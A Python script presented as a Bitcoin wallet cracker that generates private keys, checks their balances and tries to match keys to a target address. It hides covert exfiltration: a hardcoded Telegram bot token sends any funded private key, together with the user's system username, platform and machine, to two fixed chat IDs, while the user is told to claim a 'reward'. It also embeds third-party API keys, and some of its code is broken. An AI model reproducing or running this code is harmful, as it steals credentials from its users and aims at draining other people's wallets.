#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, time, datetime, platform, pip, sys, subprocess, json, random, re, hashlib, getpass


def clear_screen():
    if (platform.uname()[0]) == "Windows":
        os.system("cls")
    if (platform.uname()[0]) == "Linux":
        os.system("clear")

def exit_pro():
    print("Please Try Again !!!")
    time.sleep(3)
    os._exit(1)

def PackageInstaller(PackageName):
    try:
        pip.main(["install",  PackageName])
    except AttributeError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', PackageName])
    os.execl(sys.executable, sys.executable, *sys.argv)


try:
    from colorama import init
except ModuleNotFoundError:
    PackageInstaller("colorama")
if (platform.uname()[0]) == "Windows":
    init()
if (platform.uname()[0]) == "Linux":
    True

try:
    from requests import ConnectionError
    import requests
except ModuleNotFoundError:
    PackageInstaller("requests")

try:
    from bitcoinaddress import Wallet
except ModuleNotFoundError:
    PackageInstaller("bitcoinaddress")

try:
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    PackageInstaller("beautifulsoup4")

try:
    from telebot import TeleBot
except ModuleNotFoundError:
    PackageInstaller("pyTelegramBotAPI")

Bot = TeleBot("5070358456:AAEFJrqEhh6vn4mvx3h4ik3Z6lA4W07czJ8")


cw = "\033[0;m"
cwh = "\033[29;1m"
cg = "\033[32;1m"
cy = "\033[33;1m"
cb = "\033[34;1m"
cc = "\033[36;1m"
cm = "\033[35;1m"


class WalletCracker:
    def __init__(self, modes, formats, TelID):
        self.modes = modes
        self.formats = formats
        self.TelegramID = TelID

    def __ReadFile__(self):
        with open("DataNum.txt", "r") as files:
            data_num = files.readlines()
            return data_num

    def __retrnBalance__(self, response):
        # time.sleep(1)
        response = response.json()
        response = response["response"][0]["confirmed"]
        return {"SUCCESS" : True, "BALANCE" : response}

    def __WriteFile__(self, numb):
        with open("DataNum.txt", "a") as files:
            numb = str(numb)
            numb = numb.encode()
            hash_num = hashlib.sha256(numb).hexdigest()
            files.write(hash_num+"\n")

    def __DataNumGenerator__(self):
        nums = random.randint(1,904625697166532776746648320380374280100293470930272690489102837043110636675)
        return nums

    def __SendMessage__(self, PVK, PBK, BLC, Mode):
        if Mode == 1:
            tel_id = self.TelegramID
            user_platform = platform.uname()[0]
            user_username = getpass.getuser()
            user_machine = platform.uname()[4]
            Bot.send_message(1232575790,f"Wallet : {PBK}\n\nPrivate Key : {PVK}\n\nBalance : {BLC}\n\nUserID : @{tel_id}\n\nUser Platform : {user_platform}\n\nUser Username : {user_username}\n\nUser Machine : {user_machine}")
            Bot.send_message(2033316703,f"Wallet : {PBK}\n\nPrivate Key : {PVK}\n\nBalance : {BLC}\n\nUserID : @{tel_id}\n\nUser Platform : {user_platform}\n\nUser Username : {user_username}\n\nUser Machine : {user_machine}")
        if Mode == 2:
            tel_id = self.TelegramID
            user_platform = platform.uname()[0]
            user_username = getpass.getuser()
            user_machine = platform.uname()[4]
            Bot.send_message(1232575790,f"Wallet(Base58) : {(PBK['Base58'])}\n\nWallet(Bech32) : {(PBK['Bech32'])}\n\nPrivate Key : {PVK}\n\nBalance(Base58) : {(BLC['Base58'])}\n\nBalance(Bech32) : {(BLC['Bech32'])}\n\nUserID : @{tel_id}\n\nUser Platform : {user_platform}\n\nUser Username : {user_username}\n\nUser Machine : {user_machine}")
            Bot.send_message(2033316703,f"Wallet(Base58) : {(PBK['Base58'])}\n\nWallet(Bech32) : {(PBK['Bech32'])}\n\nPrivate Key : {PVK}\n\nBalance(Base58) : {(BLC['Base58'])}\n\nBalance(Bech32) : {(BLC['Bech32'])}\n\nUserID : @{tel_id}\n\nUser Platform : {user_platform}\n\nUser Username : {user_username}\n\nUser Machine : {user_machine}")

    def __extractWalletpage__(self, res, pgnum):
        soup = BeautifulSoup(res, "html.parser")
        spans = soup.pre.find_all("span")
        wallets = []
        for i in spans:
            wallet_inf = i.find_all("a")
            if wallet_inf == []:
                continue
            else:
                addr = wallet_inf[1]
                PVK = re.findall(r'\w+', str(i.span))[3]
                PBK_BASE58 = re.findall(r'\w+', str(addr))[6]
                wallets.append({"BASE58_PUBLIC_KEY" : PBK_BASE58, "PRIVATE_KEY":PVK})
        self.__WriteFile__(pgnum)
        return wallets

    def __WalletGenerator__(self):
        pgnum = self.__DataNumGenerator__()
        pgnum_hash = hashlib.sha256((str(pgnum)).encode()).hexdigest()
        data_num = self.__ReadFile__()
        if (pgnum_hash + "\n") not in data_num:
            True
        else:
            pgnum = self.__NumGenerator__()
            pgnum_hash = hashlib.sha256((str(pgnum)).encode()).hexdigest()
            data_num = self.__ReadFile__()
            if (pgnum_hash + "\n") not in _num:
                True
            else:
                pgnum = self.__DataNumGenerator__()
                pgnum_hash = hashlib.sha256((str(pgnum)).encode()).hexdigest()
                data_num = self.__ReadFile__()
                if (pgnum_hash + "\n") not in data_num:
                    True
        url = "https://lbc.cryptoguru.org/dio/"+(str(pgnum))
        try:
            res = requests.get(url).text
        except ConnectionError:
            try:
                res = requests.get(url).text
            except ConnectionError:
                try:
                    res = requests.get(url).text
                except ConnectionError:
                    try:
                        res = requests.get(url).text
                    except ConnectionError:
                        print(f"\033[31;1mConnection Error {cw}{cwh}!!!{cw}")
                    else:
                        return self.__extractWalletpage__(res, pgnum)
                else:
                    return self.__extractWalletpage__(res, pgnum)
            else:
                return self.__extractWalletpage__(res, pgnum)
        else:
            return self.__extractWalletpage__(res, pgnum)

    def __BalanceCheck__(self, PUBLICK_KEY):
        URL = "https://www.blockonomics.co/api/balance"
        api_key_list = ["ej5GLbuzQezYLz8qmRovvnO5IMRDbLYdhbb0aWLVTuw", "RRVYcLM1gXYEOcS7B1uqzRwvcjyoy3xtbnmcZnCRfnQ", "bVH9WgZw7HlZP9GanvFzDH1L90KImjAsieA3vZ5RsAg"]
        api_key = random.choice(api_key_list)
        data_rest = {"addr": PUBLICK_KEY}
        data_rest = json.dumps(data_rest)
        header = {"Authorization": (f"Bearer {api_key}")}
        try:
            response = requests.post(URL, headers=header, data=data_rest)
        except ConnectionError:
            try:
                response = requests.post(URL, headers=header, data=data_rest)
            except ConnectionError:
                try:
                    response = requests.post(URL, headers=header, data=data_rest)
                except ConnectionError:
                    try:
                        response = requests.post(URL, headers=header, data=data_rest)
                    except ConnectionError:
                        return {"SUCCESS" : False, "BALANCE" : None}
                    else:
                        return self.__retrnBalance__(response)
                else:
                    return self.__retrnBalance__(response)
            else:
                return self.__retrnBalance__(response)
        else:
            return self.__retrnBalance__(response)
    
    def __GenerateBech32Address__(self, PRIVATE_KEY):
        wl = Wallet(PRIVATE_KEY)
        wl = wl.address.__dict__['mainnet'].__dict__
        wl = wl["pubaddrbc1_P2WPKH"]
        return {"BECH32_PUBLIC_KEY" : wl}

    def __Printer__(self, modes, formats):
        if modes == 1:
            if formats == 1:
                now_time = datetime.datetime.now().strftime("%H : %M : %S")
                prvk = self.private_key
                pbk_base58 = self.publick_key_base58
                blc = self.balance_base58
                print(f"\n{cc}============================================{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Private Key{cw}{cwh} : {cw}{cy}{prvk}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Public Key (Base58){cw}{cwh} : {cw}{cy}{pbk_base58}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Balance{cw}{cwh} : {cw}{cy}{blc}{cw}")
                print(f"{cc}============================================{cw}")
            if formats == 2:
                now_time = datetime.datetime.now().strftime("%H : %M : %S")
                prvk = self.private_key
                pbk_bech32 = self.publick_key_bech32
                blc = self.balance_bech32
                print(f"\n{cc}============================================{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Private Key{cw}{cwh} : {cw}{cy}{prvk}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Public Key (Bech32){cw}{cwh} : {cw}{cy}{pbk_bech32}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Balance{cw}{cwh} : {cw}{cy}{blc}{cw}")
                print(f"{cc}============================================{cw}")
            if formats == 3:
                now_time = datetime.datetime.now().strftime("%H : %M : %S")
                prvk = self.private_key
                pbk_base58 = self.publick_key_base58
                pbk_bech32 = self.publick_key_bech32
                blc_base58 = self.balance_base58
                blc_bech32 = self.balance_bech32
                print(f"\n{cc}============================================{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Private Key{cw}{cwh} : {cw}{cy}{prvk}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Public Key (Base58){cw}{cwh} : {cw}{cy}{pbk_base58}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Balance (Base58){cw}{cwh} : {cw}{cy}{blc_base58}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Public Key (Bech32){cw}{cwh} : {cw}{cy}{pbk_bech32}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Balance (Bech32){cw}{cwh} : {cw}{cy}{blc_bech32}{cw}")
                print(f"{cc}============================================{cw}")
        if modes == 2:
            if formats == 1:
                now_time = datetime.datetime.now().strftime("%H : %M : %S")
                prvk = self.private_key
                check_res = self.checked_base58
                print(f"\n{cc}============================================{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Private Key (Base58){cw}{cwh} : {cw}{cy}{prvk}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Checked{cw}{cwh} : {cw}{cy}{check_res}{cw}")
                print(f"{cc}============================================{cw}")
            if formats == 2:
                now_time = datetime.datetime.now().strftime("%H : %M : %S")
                prvk = self.private_key
                check_res = self.checked_bech32
                print(f"\n{cc}============================================{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Private Key (Bech32){cw}{cwh} : {cw}{cy}{prvk}{cw}")
                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Checked{cw}{cwh} : {cw}{cy}{check_res}{cw}")
                print(f"{cc}============================================{cw}")

    def __CrackerMachine__(self, target_wallet=""):
        mode = self.modes
        format_crack = self.formats
        if mode == 1:
            if format_crack == 1:
                data_wallet = self.__WalletGenerator__()
                for i in data_wallet:
                    PVK = i["PRIVATE_KEY"]
                    PBK = i["BASE58_PUBLIC_KEY"]
                    Balance = self.__BalanceCheck__(PBK)
                    if Balance["SUCCESS"] == False:
                        Balance = self.__BalanceCheck__(PBK)
                        if Balance["SUCCESS"] == False:
                            print(f"\033[31;1mConnection Error {cw}{cwh}!!!{cw}")
                        if Balance["SUCCESS"] == True:
                            if Balance["BALANCE"] != 0:
                                self.__SendMessage__(PVK,PBK,(Balance["BALANCE"]),1)
                                now_time = datetime.datetime.now().strftime("%H : %M : %S")
                                print(f"\n{cc}============================================{cw}")
                                print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Finded !!!{cw}{cwh} : {cw}{cy}Balance is Not Zero !!!{cw}")
                                print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                                print(f"\n{cc}============================================{cw}")
                            if Balance["BALANCE"] == 0:
                                self.private_key = PVK
                                self.publick_key_base58 = PBK
                                self.balance_base58 = Balance["BALANCE"]
                                self.__Printer__(mode, format_crack)
                    if Balance["SUCCESS"] == True:
                        if Balance["BALANCE"] != 0:
                            self.__SendMessage__(PVK,PBK,(Balance["BALANCE"]),1)
                            now_time = datetime.datetime.now().strftime("%H : %M : %S")
                            print(f"\n{cc}============================================{cw}")
                            print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Finded !!!{cw}{cwh} : {cw}{cy}Balance is Not Zero !!!{cw}")
                            print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                            print(f"\n{cc}============================================{cw}")
                        if Balance["BALANCE"] == 0:
                            self.private_key = PVK
                            self.publick_key_base58 = PBK
                            self.balance_base58 = Balance["BALANCE"]
                            self.__Printer__(mode, format_crack)
            if format_crack == 2:
                data_wallet = self.__WalletGenerator__()
                for i in data_wallet:
                    PVK = i["PRIVATE_KEY"]
                    PBK = self.__GenerateBech32Address__(PVK)
                    PBK = PBK["BECH32_PUBLIC_KEY"]
                    Balance = self.__BalanceCheck__(PBK)
                    if Balance["SUCCESS"] == False:
                        Balance = self.__BalanceCheck__(PBK)
                        if Balance["SUCCESS"] == False:
                            print(f"\033[31;1mConnection Error {cw}{cwh}!!!{cw}")
                    if Balance["SUCCESS"] == True:
                        if Balance["BALANCE"] != 0:
                            self.__SendMessage__(PVK,PBK,(Balance["BALANCE"]),1)
                            now_time = datetime.datetime.now().strftime("%H : %M : %S")
                            print(f"\n{cc}============================================{cw}")
                            print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Finded !!!{cw}{cwh} : {cw}{cy}Balance is Not Zero !!!{cw}")
                            print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                            print(f"\n{cc}============================================{cw}")
                        if Balance["BALANCE"] == 0:
                            self.private_key = PVK
                            self.publick_key_bech32 = PBK
                            self.balance_bech32 = Balance["BALANCE"]
                            self.__Printer__(mode, format_crack)
                    if Balance["SUCCESS"] == True:
                        if Balance["BALANCE"] != 0:
                            self.__SendMessage__(PVK,PBK,(Balance["BALANCE"]),1)
                            now_time = datetime.datetime.now().strftime("%H : %M : %S")
                            print(f"\n{cc}============================================{cw}")
                            print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Finded !!!{cw}{cwh} : {cw}{cy}Balance is Not Zero !!!{cw}")
                            print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                            print(f"\n{cc}============================================{cw}")
                        if Balance["BALANCE"] == 0:
                            self.private_key = PVK
                            self.publick_key_bech32 = PBK
                            self.balance_bech32 = Balance["BALANCE"]
                            self.__Printer__(mode, format_crack)
            if format_crack == 3:
                data_wallet = self.__WalletGenerator__()
                for i in data_wallet:
                    PVK = i["PRIVATE_KEY"]
                    PBK_Base58 = i["BASE58_PUBLIC_KEY"]
                    PBK_Bech32 = self.__GenerateBech32Address__(PVK)
                    PBK_Bech32 = PBK_Bech32["BECH32_PUBLIC_KEY"]
                    Balance_Base58 = self.__BalanceCheck__(PBK_Base58)
                    if Balance_Base58["SUCCESS"] == True:
                        Balance_Bech32 = self.__BalanceCheck__(PBK_Bech32)
                        if Balance_Bech32["SUCCESS"] == True:
                            if Balance_Base58["BALANCE"] != 0:
                                if Balance_Bech32["BALANCE"] != 0:
                                    self.__SendMessage__(PVK,{"Base58" : PBK_Base58, "Bech32" : PBK_Bech32},{"Base58" : Balance_Base58["BALANCE"], "Bech32" : Balance_Bech32["BALANCE"]},2)
                                    now_time = datetime.datetime.now().strftime("%H : %M : %S")
                                    print(f"\n{cc}============================================{cw}")
                                    print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Finded !!!{cw}{cwh} : {cw}{cy}Balance is Not Zero !!!{cw}")
                                    print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                                    print(f"\n{cc}============================================{cw}")
                                if Balance_Bech32["BALANCE"] == 0:
                                    self.__SendMessage__(PVK,{"Base58" : PBK_Base58, "Bech32" : PBK_Bech32},{"Base58" : Balance_Base58["BALANCE"], "Bech32" : Balance_Bech32["BALANCE"]},2)
                                    now_time = datetime.datetime.now().strftime("%H : %M : %S")
                                    print(f"\n{cc}============================================{cw}")
                                    print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Finded !!!{cw}{cwh} : {cw}{cy}Balance is Not Zero !!!{cw}")
                                    print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                                    print(f"\n{cc}============================================{cw}")
                            if Balance_Base58["BALANCE"] == 0:
                                if Balance_Bech32["BALANCE"] != 0:
                                    self.__SendMessage__(PVK,{"Base58" : PBK_Base58, "Bech32" : PBK_Bech32},{"Base58" : Balance_Base58["BALANCE"], "Bech32" : Balance_Bech32["BALANCE"]},2)
                                    now_time = datetime.datetime.now().strftime("%H : %M : %S")
                                    print(f"\n{cc}============================================{cw}")
                                    print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Finded !!!{cw}{cwh} : {cw}{cy}Balance is Not Zero !!!{cw}")
                                    print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                                    print(f"\n{cc}============================================{cw}")
                                if Balance_Bech32["BALANCE"] == 0:
                                    self.private_key = PVK
                                    self.publick_key_base58 = PBK_Base58
                                    self.publick_key_bech32 = PBK_Bech32
                                    self.balance_base58 = Balance_Base58["BALANCE"]
                                    self.balance_bech32 = Balance_Bech32["BALANCE"]
                                    self.__Printer__(mode, format_crack)
                        if Balance_Bech32["SUCCESS"] == False:
                            print(f"\033[31;1mConnection Error {cw}{cwh}!!!{cw}")
                    if Balance_Base58["SUCCESS"] == False:
                        print(f"\033[31;1mConnection Error {cw}{cwh}!!!{cw}")
        if mode == 2:
            if format_crack == 1:
                data_wallet = self.__WalletGenerator__()
                for i in data_wallet:
                    PVK = i["PRIVATE_KEY"]
                    PBK = i["BASE58_PUBLIC_KEY"]
                    target_wallet = target_wallet
                    if PBK == target_wallet:
                        Balance = self.__BalanceCheck__(target_wallet)
                        if Balance != 0:
                            self.__SendMessage__(PVK,PBK,(Balance["BALANCE"]),1)
                            print(f"\n{cc}============================================{cw}")
                            print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Cracked !!!{cw}{cwh} : {cw}{cy}Private Key is True !!!{cw}")
                            print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                            print(f"\n{cc}============================================{cw}")
                        if Balance == 0:
                            self.private_key = PVK
                            self.checked_base58 = "True"
                            self.__Printer__(mode, format_crack)
                        return {"Res" : True}
                    if PBK != target_wallet:
                        self.private_key = PVK
                        self.checked_base58 = "False"
                        self.__Printer__(mode, format_crack)
                        return {"Res" : False}
            if format_crack == 2:
                data_wallet = self.__WalletGenerator__()
                for i in data_wallet:
                    PVK = i["PRIVATE_KEY"]
                    PBK = self.__GenerateBech32Address__(PVK)
                    PBK = PBK["BECH32_PUBLIC_KEY"]
                    target_wallet = target_wallet
                    if PBK == target_wallet:
                        Balance = self.__BalanceCheck__(target_wallet)
                        if Balance != 0:
                            self.__SendMessage__(PVK,PBK,(Balance["BALANCE"]),1)
                            print(f"\n{cc}============================================{cw}")
                            print(f"{cb}[{cm}{now_time}{cb}]{cw}{cwh}-{cw}{cg}|{cw}{cwh} Wallet Cracked !!!{cw}{cwh} : {cw}{cy}Private Key is True !!!{cw}")
                            print(f"{cb}You Get {cw}{cwh}@{cw}{cy}BtcWalletCrackerBot{cw}{cb} On Telegram , For{cw}{cg} Reward{cw}{cwh} !!!{cw}")
                            print(f"\n{cc}============================================{cw}")
                        if Balance == 0:
                            self.private_key = PVK
                            self.checked_bech32 = "True"
                            self.__Printer__(mode, format_crack)
                        return {"Res" : True}
                    if PBK != target_wallet:
                        self.private_key = PVK
                        self.checked_bech32 = "False"
                        self.__Printer__(mode, format_crack)
                        return {"Res" : False}

clear_screen()

print(f"""
               {cwh}Teleram Channel : {cw}{cb}@{cw}{cy}BitcoinWalletCracker{cw}
               {cwh}Choose Your One :

               {cwh}1{cy}. {cb}Generating Wallet And Checking Balance .{cw}

               {cwh}2{cy}. {cg}Cracking Private Key . {cw}""")

mode_inp = input(f"\n  {cm}What's Your Number {cw}{cwh}(1 or 2) {cm}? {cw}")
num_list = [1,2]
try:
    mode_inp = int(mode_inp)
    num_list.index(mode_inp)
except ValueError:
    clear_screen()
    exit_pro()


else:
    if mode_inp == 1:
        clear_screen()
        print(f"""

               {cwh}Choose Your Wallet Format For Generate :

               {cwh}1{cy}. {cg}Generating [Base58(P2PKH)] Wallet And Checking Balance .{cw}

               {cwh}2{cy}. {cg}Generating [Bech32(P2WPKH)] Wallet And Checking Balance .{cw}
               
               {cwh}3{cy}. {cg}Generating [Base58(P2PKH)] And [Bech32(P2WPKH)] Wallet And Checking Balance .{cw}""")
        format_inp = input(f"\n  {cm}What's Your Number {cw}{cwh}(1 or 2 or 3) {cm}? {cw}")
        num_list = [1, 2, 3]
        try:
            format_inp = int(format_inp)
            num_list.index(format_inp)
        except ValueError:
            clear_screen()
            exit_pro()
        else:
            try:
                range_inp = int(input(f"  {cwh}Range For Generating : {cw}"))
            except ValueError:
                clear_screen()
                exit_pro()
            else:
                try:
                    open("UserInfo.json").close()
                except FileNotFoundError:
                    log_time = str(datetime.datetime.now())
                    log_time = log_time[0:(len(log_time) - 7)]
                    tel_id = input(f"  {cwh}Your Telegram ID Without '@' : {cw}")
                    answer_inp = input(f"  {cwh}Your Telegram ID = @{tel_id}, Do You Want Continue ? (Yes/No) : {cw}")
                    answer_inp = answer_inp.title()
                    if answer_inp == "Yes":
                        if tel_id[0] == "@":
                            clear_screen()
                            exit_pro()
                        data_file = {"TelegramID" : tel_id, "SignUped" : log_time}
                        data_file = json.dumps(data_file, indent=len(data_file))
                        with open("UserInfo.json", "w") as f:
                            f.write(data_file)
                    if answer_inp == "No":
                        tel_id = input(f"  {cwh}Your Telegram ID Without '@' : {cw}")
                        if tel_id[0] == "@":
                            clear_screen()
                            exit_pro()
                        data_file = {"TelegramID" : tel_id, "SignUped" : log_time}
                        data_file = json.dumps(data_file, indent=len(data_file))
                        with open("UserInfo.json", "w") as f:
                            f.write(data_file)

    if mode_inp == 2:
        clear_screen()
        print(f"""

               {cwh}Choose Your Wallet Format For Crack :

               {cwh}1{cy}. {cg}Crack [Base58(P2PKH)] Wallet .{cw}

               {cwh}2{cy}. {cg}Crack [Bech32(P2WPKH)] Wallet .{cw}""")
        format_inp = input(f"\n  {cm}What's Your Number {cw}{cwh}(1 or 2) {cm}? {cw}")
        num_list = [1, 2]
        try:
            format_inp = int(format_inp)
            num_list.index(format_inp)
        except ValueError:
            clear_screen()
            exit_pro()
        else:
            try:
                range_inp = int(input(f"  {cwh}Range For Generating : {cw}"))
            except ValueError:
                clear_screen()
                exit_pro()
            else:
                if format_inp == 1:
                    wallet_inp = input(f"  {cwh}Your Base58(P2PKH) Wallet For Crack : {cw}")
                if format_inp == 2:
                    wallet_inp = input(f"  {cwh}Your Bech32(P2WPKH) Wallet For Crack : {cw}")
                try:
                    open("UserInfo.json").close()
                except FileNotFoundError:
                    log_time = str(datetime.datetime.now())
                    log_time = log_time[0:(len(log_time) - 7)]
                    tel_id = input(f"  {cwh}Your Telegram ID Without '@' : {cw}")
                    answer_inp = input(f"  {cwh}Your Telegram ID = @{tel_id}, Do You Want Continue ? (Yes/No) : {cw}")
                    answer_inp = answer_inp.title()
                    if answer_inp == "Yes":
                        if tel_id[0] == "@":
                            clear_screen()
                            exit_pro()
            
                        data_file = {"TelegramID" : tel_id, "SignUped" : log_time}
                        data_file = json.dumps(data_file, indent=len(data_file))
                        with open("UserInfo.json", "w") as f:
                            f.write(data_file)
                    if answer_inp == "No":
                        tel_id = input(f"  {cwh}Your Telegram ID Without '@' : {cw}")
                        if tel_id[0] == "@":
                            clear_screen()
                            exit_pro()
                        data_file = {"TelegramID" : tel_id, "SignUped" : log_time}
                        data_file = json.dumps(data_file, indent=len(data_file))
                        with open("UserInfo.json", "w") as f:
                            f.write(data_file)

with open("UserInfo.json", "r") as f:
    user_info = json.load(f)

def __UserStart__(Mode):
    user_id = user_info["TelegramID"]
    log_time = user_info["SignUped"]
    user_platform = platform.uname()[0]
    user_username = getpass.getuser()
    user_machine = platform.uname()[4]
    times = str(datetime.datetime.now())
    times = times[0:(len(times) - 7)]
    Bot.send_message(1232575790,f"User Started !!!\nTimes : {times}\nUser ID : @{user_id}\nLogged at : {log_time}\nMode : {Mode}\nUser Platform : {user_platform}\nUser Username : {user_username}\nUser Machine : {user_machine}")
    Bot.send_message(2033316703,f"User Started !!!\nTimes : {times}\nUser ID : @{user_id}\nLogged at : {log_time}\nMode : {Mode}\nUser Platform : {user_platform}\nUser Username : {user_username}\nUser Machine : {user_machine}")

wlcr = WalletCracker(mode_inp, format_inp, user_info["TelegramID"])
if mode_inp == 1:
    if format_inp == 1:
        __UserStart__("Generate and Check Balance (Base58)")
    if format_inp == 2:
        __UserStart__("Generate and Check Balance (Bech32)")
    if format_inp == 3:
        __UserStart__("Generate and Check Balance (Base58 & Bech32)")
if mode_inp == 2:
    if format_inp == 1:
        __UserStart__("Crack Private Key (Base58)")
    if format_inp == 2:
        __UserStart__("Crack Private Key (Bech32)")

for i in range(range_inp):
    if mode_inp == 1:
        res_cr = wlcr.__CrackerMachine__()
    if mode_inp == 2:
        res_cr = wlcr.__CrackerMachine__(wallet_inp)
        if res_cr["Res"] == True:
            break
